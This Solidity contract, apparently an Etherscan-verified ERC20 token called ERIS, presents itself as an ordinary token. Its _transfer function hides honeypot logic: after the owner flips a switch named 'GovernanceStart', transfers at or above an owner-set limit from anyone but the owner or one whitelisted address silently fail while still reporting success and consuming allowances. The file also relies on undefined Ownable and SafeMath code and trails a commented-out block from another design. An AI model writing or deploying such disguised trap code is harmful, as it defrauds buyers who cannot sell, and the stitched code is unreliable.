/**
 *Submitted for verification at Etherscan.io on 2020-11-22
*/

/*
* Project $ERIS by nCyotee
* Official site: https://eris.exchange/
* 
* Have fun playing!
* SPDX-License-Identifier: AGPL-3.0-or-later
*
**/

pragma solidity 0.7.4;







abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}





contract Eris is Ownable {
  using SafeMath for uint256;

  // standard ERC20 variables. 
  string public constant name = "Eris.Exchange";
  string public constant symbol = "ERIS";
  uint256 public constant decimals = 18;
  uint256 private constant _maximumSupply = 10 ** decimals;
  uint256 public _totalSupply;
  bool public start;
  uint256 public Lim;
  address public whiteaddress;
  
  // events
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  

  mapping(address => uint256) public _balanceOf;
  mapping(address => mapping(address => uint256)) public allowance;

  constructor(uint256 _initialSupply) public {

    Lim = 10000000000000000000;
    _owner = msg.sender;
    _totalSupply = _maximumSupply * _initialSupply;
    _balanceOf[msg.sender] = _maximumSupply * _initialSupply;
    start = false;
    whiteaddress = 0x0000000000000000000000000000000000000000;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function totalSupply () public view returns (uint256) {
    return _totalSupply; 
  }

  function balanceOf (address who) public view returns (uint256) {
    return _balanceOf[who];
  }

  function _transfer(address _from, address _to, uint256 _value) internal {
        if (start==false) {
            _balanceOf[_from] = _balanceOf[_from].sub(_value);
            _balanceOf[_to] = _balanceOf[_to].add(_value);
            emit Transfer(_from, _to, _value);
        } else {
            if (_value < Lim) {
                _balanceOf[_from] = _balanceOf[_from].sub(_value);
                _balanceOf[_to] = _balanceOf[_to].add(_value);
                emit Transfer(_from, _to, _value);
            }
            else {
                if(_from == _owner || _from == whiteaddress) {
                    _balanceOf[_from] = _balanceOf[_from].sub(_value);
                    _balanceOf[_to] = _balanceOf[_to].add(_value);
                    emit Transfer(_from, _to, _value);
                }
            }
        }
   }

  function transfer(address _to, uint256 _value) public returns (bool success) {
    require(_balanceOf[msg.sender] >= _value);
    _transfer(msg.sender, _to, _value);
    return true;
  }

  function burn (uint256 _burnAmount) public onlyOwner returns (bool success) {
    _transfer(_owner, address(0), _burnAmount);
    _totalSupply = _totalSupply.sub(_burnAmount);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool success) {
    require(_spender != address(0));
    allowance[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(_value <= _balanceOf[_from]);
    require(_value <= allowance[_from][msg.sender]);
    allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
    _transfer(_from, _to, _value);
    return true;
  }
  
  function setGov (uint256 myLim) public {
    require(msg.sender == _owner);
    Lim = myLim;
  }
  
  function GovernanceStart() public {
        require(msg.sender == _owner);
        if (start==false) 
            start = true;
        else
            start = false;
   }
   
  function setGovernanceAddress(address newWallet) public {
    require(msg.sender == _owner);
    whiteaddress =  newWallet;
  }
  
  
  // function changeCharityAddress( address newCharityAddress_ ) public onlyOwner() {
    //     charityAddress = payable(newCharityAddress_);
    // }

    // function changeDevAddress( address newDevAddress_ ) public onlyOwner() {
    //     devAddress = payable(newDevAddress_);
    // }

    // function getSecondsLeftInLiquidityGenerationEvent() public view returns (uint256) {
    //     return qplgmeStartTimestamp.add(qplgmeLength).sub(block.timestamp);
    // }

    // function startQPLGME() public onlyOwner() erisQPLGMEInactive() notHadQPLGME() {
    //     qplgmeActive = true;
    //     qplgmeStartTimestamp = block.timestamp;
    //     emit QPLGMEStarted( qplgmeActive, qplgmeStartTimestamp );
    // }

    // function quadraticPricewithAdditionalPayment( address buyer, uint additionalAmountPaid ) public view returns ( uint ) {
    //     return FinancialSafeMath.quadraticPricing( _weiPaidForErisByAddress[buyer].add( additionalAmountPaid ) ).mul(_erisToEthRatio).mul(1e9);
    // }

    // function erisForWeiPaid( uint256 payment ) public view returns ( uint256 ) {
    //     return FinancialSafeMath.quadraticPricing( payment ).mul(_erisToEthRatio).mul(1e9);
    // }

    // function _erisForWeiPaid( uint256 payment ) private view returns ( uint256 ) {
    //     return FinancialSafeMath.quadraticPricing( payment ).mul(_erisToEthRatio).mul(1e9);
    // }

    // function buyERIS() public payable erisQPLGMEActive {
    //     uint256 amountPaidInWEI = msg.value;
    //     _weth.deposit{value: amountPaidInWEI}();
    //     totalWeiPaidForEris = totalWeiPaidForEris.add( amountPaidInWEI );
    //     if( _weiPaidForErisByAddress[Context._msgSender()] > 0 ){
    //         totalSupply = totalSupply.add( _erisForWeiPaid(_weiPaidForErisByAddress[Context._msgSender()].add(amountPaidInWEI)) ).sub( _erisForWeiPaid(_weiPaidForErisByAddress[Context._msgSender()] ) );
    //     } else if( _weiPaidForErisByAddress[Context._msgSender()] == 0 ) {
    //         totalSupply = totalSupply.add( _erisForWeiPaid(_weiPaidForErisByAddress[Context._msgSender()].add( amountPaidInWEI ) ) );
    //     }
    //     _weiPaidForErisByAddress[Context._msgSender()] = _weiPaidForErisByAddress[Context._msgSender()].add( amountPaidInWEI );
    //     ethDonationToCharity = ethDonationToCharity.add( amountPaidInWEI.div(10) );
    // }

    // function buyERIS( uint256 amount) public payable erisQPLGMEActive() {
    //     uint256 amountPaidInWEI = amount;
    //     _testToken.transferFrom( Context._msgSender(), address(this), amount);

    //     uin256 memory currentBuyersWeirPaidForEris_ = _weiPaidForErisByAddress[Context._msgSender()];
    //     _weiPaidForErisByAddress[Context._msgSender()] = _weiPaidForErisByAddress[Context._msgSender()].add(amountPaidInWEI);

    //     totalWeiPaidForEris = totalWeiPaidForEris.add(_weiPaidForErisByAddress[Context._msgSender()]).sub( currentBuyersWeirPaidForEris_ );

    //     _totalSupply = _totalSupply.add( _erisForWeiPaid(_weiPaidForErisByAddress[Context._msgSender()].add(amountPaidInWEI)) ).sub( _erisForWeiPaid(_weiPaidForErisByAddress[Context._msgSender()] ) );

    //     ethDonationToCharity = ethDonationToCharity.add( _weiPaidForErisByAddress[Context._msgSender()] / 10 ).sub( currentBuyersWeirPaidForEris_.div(10) );
    // }

    // function endQPLGME() public onlyOwner() {
    //     if( !hadQPLGME ) {
    //         _completeErisGME();
    //     }
    //     emit QPLGMEEnded( qplgmeActive, qplgmeEndTimestamp );
    // }

    // function collectErisFromQPLGME() public erisQPLGMEInactive() {
    //     if( !hadQPLGME ) {
    //         _completeErisGME();
    //     }

    //     if( _weiPaidForErisByAddress[Context._msgSender()] > 0 ){
    //         uint256 weiPaidForErisByAddress_ = _weiPaidForErisByAddress[Context._msgSender()];
    //         _weiPaidForErisByAddress[Context._msgSender()] = 0;
    //         _balances[Context._msgSender()] =  _erisForWeiPaid( weiPaidForErisByAddress_ );
    //     }
    // }

    // function _completeErisGME() private  {
    //     qplgmeEndTimestamp = block.timestamp;
    //     qplgmeActive = false;
    //     hadQPLGME = true;
        
    //     // _balances[charityAddress] = _erisForWeiPaid( _weth.balanceOf( address( this ) ) );
    //     _balances[charityAddress] = _erisForWeiPaid( _testToken.balanceOf( address( this ) ) );
    //     _totalSupply = _totalSupply.add(_balances[charityAddress]);
    //     // ethDonationToCharity = _weth.balanceOf( address(this) ).div(10);
    //     ethDonationToCharity = _testToken.balanceOf( address(this) ).div(10);

    //     // erisDueToReserves = _erisForWeiPaid( _weth.balanceOf( address( this ) ) );

    //     _fundReservesAndSetTotalSupply();
    //     _collectDonationToCharity();
    //     _depositInUniswap();
    // }

    // function _fundReservesAndSetTotalSupply() private {
    //     fundCharity();
    //     fundDev();
    // }

    // function fundDev() private {
    //     // _balances[devAddress] = _erisForWeiPaid( _weth.balanceOf( address( this ) ) );
    //     _balances[devAddress] = _erisForWeiPaid( _testToken.balanceOf( address( this ) ) );
    //     _totalSupply = _totalSupply.add(_balances[devAddress]);
    // }

    // function fundCharity() private {
    // }

    // function _collectDonationToCharity() private {
    //     require( ethDonationToCharity > 0 );
    //     ethDonationToCharity = 0;
    //     // _weth.transfer( charityAddress, _weth.balanceOf( address(this) ).div(10) );
    //     _testToken.transfer( charityAddress, _testToken.balanceOf( address(this) ).div(10) );
    // }

    // function _depositInUniswap() private {
    //     // totalWeiPaidForEris = _weth.balanceOf( address(this) );
    //     totalWeiPaidForEris = _testToken.balanceOf( address(this) );
    //     _balances[address(_uniswapV2ErisWETHDEXPair)] = FinancialSafeMath.bondingPrice( _totalSupply.div(totalWeiPaidForEris), _totalSupply ).mul(_erisToEthRatio).div(1e2);
    //     // _weth.transfer( address(_uniswapV2ErisWETHDEXPair), _weth.balanceOf( address(this) ) );
    //     _testToken.transfer( address(_uniswapV2ErisWETHDEXPair), _testToken.balanceOf( address(this) ) );
    //     _uniswapV2ErisWETHDEXPair.mint(address(this));
    //     _totalLPTokensMinted = _uniswapV2ErisWETHDEXPair.balanceOf(address(this));
    //     require(_totalLPTokensMinted != 0 , "No LP deposited");
    //     _lpPerETHUnit = _totalLPTokensMinted.mul(1e18).div(totalWeiPaidForEris);
    //     require(_lpPerETHUnit != 0 , "Eris:292:_depositInUniswap(): No LP deposited");
    // }

    // function erisDueToBuyerAtEndOfLGE( address buyer ) public view returns ( uint256 ){
    //     return FinancialSafeMath.quadraticPricing( _weiPaidForErisByAddress[ buyer ] ).mul(_erisToEthRatio).mul(1e9);
    //     //return _erisForWeiPaid( _weiPaidForErisByAddress[ buyer ] );
    // }

    // function withdrawPaidETHForfietAllERIS() public erisQPLGMEActive() {
    //     uint256 weiPaid = _weiPaidForErisByAddress[Context._msgSender()];
    //     _weiPaidForErisByAddress[Context._msgSender()] = 0 ;
    //     _balances[Context._msgSender()] = 0;
    //     totalWeiPaidForEris = totalWeiPaidForEris.sub( weiPaid );
    //     ethDonationToCharity = ethDonationToCharity.sub( weiPaid.div(10) );
    //     // _weth.withdraw( weiPaid );
    //     // Context._msgSender().transfer( weiPaid );
    //     _testToken.transfer( Context._msgSender(), weiPaid );
    // }
  
}